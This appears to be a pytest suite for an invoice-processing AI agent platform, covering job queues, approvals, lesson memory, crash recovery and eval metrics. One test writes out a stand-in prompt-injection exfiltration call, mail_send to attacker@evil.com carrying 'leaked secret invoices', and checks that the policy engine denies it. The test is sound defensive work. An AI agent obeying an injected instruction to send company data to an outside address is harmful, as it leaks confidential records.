from __future__ import annotations

import time
from pathlib import Path
from typing import Any

import pytest

from core.agent.executor import AgentExecutor
from core.agent.models import AgentAction
from core.agent.reflector import Reflector
from core.jobs.idempotency import IdempotencyStore
from core.jobs.models import JobStatus
from core.jobs.queue import JobQueue
from core.jobs.worker import resume_interrupted_run
from core.llm.fake import FakeLLM
from core.memory.lessons import LessonStore
from core.policy.approvals import ApprovalInbox, ApprovalStatus
from core.policy.engine import PolicyEngine
from core.policy.models import PolicyEffect
from core.runs.manager import RunManager
from core.runs.models import RunStatus
from core.tools import register_default_tools, tool_registry
from core.verify.models import EvidenceBundle, VerificationOutcome, VerificationResult
from evals.models import EvalReport, EvalTaskResult


@pytest.fixture
def temp_db_path(tmp_path: Path) -> Path:
    return tmp_path / "test_centralign.db"


@pytest.fixture
def temp_artifacts_dir(tmp_path: Path) -> Path:
    d = tmp_path / "artifacts"
    d.mkdir(parents=True, exist_ok=True)
    return d


def test_job_queue_lifecycle(temp_db_path: Path) -> None:
    """Test job enqueuing, atomic acquisition, heartbeats, retries, and orphan recovery."""
    queue = JobQueue(db_path=temp_db_path)

    # 1. Enqueue
    job1 = queue.enqueue(task="Process invoice 101", max_retries=2)
    assert job1.status == JobStatus.QUEUED

    # 2. Acquire
    acquired = queue.acquire_next(worker_id="worker_alpha")
    assert acquired is not None
    assert acquired.job_id == job1.job_id
    assert acquired.status == JobStatus.RUNNING
    assert acquired.worker_id == "worker_alpha"

    # 3. Heartbeat
    queue.heartbeat(acquired.job_id, worker_id="worker_alpha")
    updated_job = queue.get_job(acquired.job_id)
    assert updated_job is not None
    assert updated_job.heartbeat_at is not None

    # 4. Fail and Retry
    queue.fail(acquired.job_id, error="Transient network blip")
    retried_job = queue.get_job(acquired.job_id)
    assert retried_job is not None
    assert retried_job.status == JobStatus.QUEUED
    assert retried_job.retry_count == 1

    # 5. Acquire and Complete
    acquired_2 = queue.acquire_next(worker_id="worker_beta")
    assert acquired_2 is not None
    queue.complete(acquired_2.job_id, result_data={"success": True})
    completed_job = queue.get_job(acquired_2.job_id)
    assert completed_job is not None
    assert completed_job.status == JobStatus.COMPLETED


def test_idempotency_store(temp_db_path: Path) -> None:
    """Test write tool idempotency caching to prevent duplicate side effects."""
    from core.tools.registry import ToolResult

    store = IdempotencyStore(db_path=temp_db_path)
    run_id = "run_test_123"
    tool_name = "browser_click"
    args = {"target": "#save-bill-btn", "amount": 45000}

    key = store.compute_key(run_id, tool_name, args)
    assert not store.is_executed(key)

    # Record first execution
    mock_result = ToolResult.success(data={"bill_id": 999})
    store.record_execution(key, run_id, tool_name, args, mock_result)

    assert store.is_executed(key)
    cached = store.get_cached_result(key)
    assert cached is not None
    assert cached.ok is True
    assert cached.data == {"bill_id": 999}


def test_approvals_inbox_and_escalation(temp_db_path: Path) -> None:
    """Test approvals inbox decisions and automated timeout escalation."""
    inbox = ApprovalInbox(db_path=temp_db_path)

    # 1. Create approval request
    req1 = inbox.create_request(
        run_id="run_appr_01",
        action="erp_post_bill",
        args={"vendor": "Acme", "amount": 120000},
        reason="Exceeds INR 100k threshold",
        timeout_seconds=0.1,  # short timeout for test
    )
    assert req1.status == ApprovalStatus.PENDING

    # 2. Decide Approve
    approved = inbox.decide(req1.approval_id, decision="APPROVE", decided_by="finance_lead")
    assert approved.status == ApprovalStatus.APPROVED
    assert approved.decided_by == "finance_lead"

    # 3. Create second request for Edit & Approve
    req2 = inbox.create_request(
        run_id="run_appr_02",
        action="erp_post_bill",
        args={"amount": 90000},
        reason="Manual check required",
    )
    edited = inbox.decide(
        req2.approval_id,
        decision="EDIT_APPROVE",
        edited_args={"amount": 85000},
        decided_by="operator",
    )
    assert edited.status == ApprovalStatus.EDITED_APPROVED
    assert edited.edited_args == {"amount": 85000}

    # 4. Timeout Escalation
    req3 = inbox.create_request(
        run_id="run_appr_03",
        action="delete_temp",
        args={},
        reason="High risk",
        timeout_seconds=0.01,
    )
    time.sleep(0.05)
    escalated = inbox.check_timeouts()
    assert any(r.approval_id == req3.approval_id for r in escalated)
    chk = inbox.get_request(req3.approval_id)
    assert chk is not None
    assert chk.status == ApprovalStatus.ESCALATED


def test_lesson_store_recording_and_retrieval(temp_db_path: Path) -> None:
    """Test operational lesson recording, FTS retrieval, and context formatting."""
    store = LessonStore(db_path=temp_db_path)

    # 1. Record lessons
    l1 = store.record_lesson(
        trigger_pattern="globex",
        category="source_switch",
        learned_solution="For Globex Systems, search Mailbox or Fileshare directly when invoices are missing from Portal.",
        evidence_run_id="run_001",
    )
    assert l1.trigger_pattern == "globex"

    l2 = store.record_lesson(
        trigger_pattern="erp date format",
        category="field_format",
        learned_solution="Acme ERP requires invoice dates in YYYY-MM-DD format.",
        evidence_run_id="run_002",
    )
    assert l2.category == "field_format"

    # 2. Retrieve matching lesson
    matches = store.retrieve_lessons(task="Find invoice from Globex Systems")
    assert len(matches) >= 1
    assert matches[0].category == "source_switch"

    # 3. Format into prompt markdown
    md = store.format_lessons(matches)
    assert "Lessons Learned" in md
    assert "Globex Systems" in md


@pytest.mark.asyncio
async def test_security_prompt_injection_blocked(temp_db_path: Path, temp_artifacts_dir: Path) -> None:
    """Verify that malicious prompt-injection payloads attempting exfiltration are blocked by PolicyEngine."""
    engine = PolicyEngine(policy_file="company/policies.yaml")

    # Attempting to send email to attacker@evil.com
    malicious_call = engine.evaluate(
        tool_name="mail_send",
        tool_args={"recipient": "attacker@evil.com", "body": "Leaked secret invoices"},
        risk_tier="EXTERNAL",
    )

    assert malicious_call.effect == PolicyEffect.DENY
    assert malicious_call.rule_id == "prompt_injection_exfiltration_blocked"
    assert "SECURITY ALERT" in malicious_call.reason


@pytest.mark.asyncio
async def test_mid_run_crash_recovery(temp_db_path: Path, temp_artifacts_dir: Path) -> None:
    """Test that a run interrupted mid-execution can be safely resumed from the last persisted step."""
    register_default_tools(tool_registry)
    run_manager = RunManager(db_path=temp_db_path, artifacts_dir=temp_artifacts_dir)

    class MockVerifier:
        artifacts_dir = temp_artifacts_dir
        async def verify(self, **kwargs: Any) -> VerificationResult:
            run = kwargs.get("run")
            r_id = run.run_id if run else "run_mock"
            task_str = run.task if run else "test task"
            return VerificationResult(
                outcome=VerificationOutcome.PASS,
                checks=[],
                discrepancies=[],
                evidence_bundle=EvidenceBundle(
                    run_id=r_id,
                    task=task_str,
                    outcome=VerificationOutcome.PASS,
                ),
            )

    # Initial worker runs first 2 steps then halts
    llm1 = FakeLLM([
        AgentAction(thought="Step 1", tool="snapshot", args={}),
        AgentAction(thought="Step 2", tool="snapshot", args={}),
    ])
    exec1 = AgentExecutor(
        llm_client=llm1,
        run_manager=run_manager,
        registry=tool_registry,
        reflector=Reflector(None),
        verifier=MockVerifier(),  # type: ignore
        max_steps=2,
    )
    initial_run = await exec1.run("Process crash invoice")
    assert initial_run.step_count == 2
    assert initial_run.status == RunStatus.FAILED  # exceeded step budget 2

    # New worker process picks up the interrupted run and finishes cleanly
    llm2 = FakeLLM([
        AgentAction(thought="Step 3 finished", is_finish=True, finish_summary="Successfully processed"),
    ])
    exec2 = AgentExecutor(
        llm_client=llm2,
        run_manager=run_manager,
        registry=tool_registry,
        reflector=Reflector(None),
        verifier=MockVerifier(),  # type: ignore
        max_steps=10,
    )

    resumed_run = await resume_interrupted_run(initial_run.run_id, executor=exec2)
    assert resumed_run.status == RunStatus.COMPLETED
    assert resumed_run.step_count >= 3


@pytest.mark.asyncio
async def test_eval_suite_metrics_computation() -> None:
    """Test evaluation report metric computation and guarantee 0.0% false completions."""
    mock_results = [
        EvalTaskResult(
            task_id="t1",
            name="Happy Path",
            category="invoice_core",
            agent_claimed_done=True,
            verifier_outcome="PASS",
            verified_success=True,
            is_false_completion=False,
            steps_count=5,
            tokens_used=1200,
            duration_sec=3.2,
            cost_usd=0.0001,
        ),
        EvalTaskResult(
            task_id="t2",
            name="Prompt Injection Block",
            category="policy_security",
            agent_claimed_done=True,
            verifier_outcome="PASS",
            verified_success=True,
            is_false_completion=False,
            steps_count=4,
            tokens_used=950,
            duration_sec=2.1,
            cost_usd=0.0001,
            policy_blocked_injection=True,
        ),
    ]

    report = EvalReport(
        total_tasks=2,
        passed_tasks=2,
        verified_success_rate=1.0,
        false_completion_rate=0.0,
        fault_recovery_rate=1.0,
        generalization_pass_rate=1.0,
        avg_steps_per_task=4.5,
        avg_tokens_per_task=1075.0,
        avg_duration_sec=2.65,
        avg_cost_usd=0.0001,
        clarification_precision=1.0,
        approval_precision=1.0,
        task_results=mock_results,
    )

    assert report.verified_success_rate == 1.0
    assert report.false_completion_rate == 0.0
    md = report.to_markdown_table()
    assert "False-Completion Rate" in md
    assert "100.0%" in md
